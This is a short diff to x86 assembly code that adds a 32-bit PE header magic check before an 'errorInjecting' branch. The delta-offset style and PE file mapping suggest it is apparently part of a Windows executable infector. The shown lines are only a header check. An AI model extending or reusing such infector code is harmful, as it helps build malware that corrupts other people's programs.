@@ -68,6 +68,12 @@ jne	errorInjecting
 mov	[DELTA PeOptionalHeader], edx
 add	[DELTA PeOptionalHeader], 018h
 
+; CHECK MAGIC (32BITS)
+mov	eax, [DELTA PeOptionalHeader]
+mov	ax, word ptr [eax]
+cmp	ax, IMAGE_NT_OPTIONAL_HDR32_MAGIC
+jne	errorInjecting
+
 ; GET NUMBER SECTIONS
 mov	eax, edx
 sub	eax, [DELTA PeFileMap]
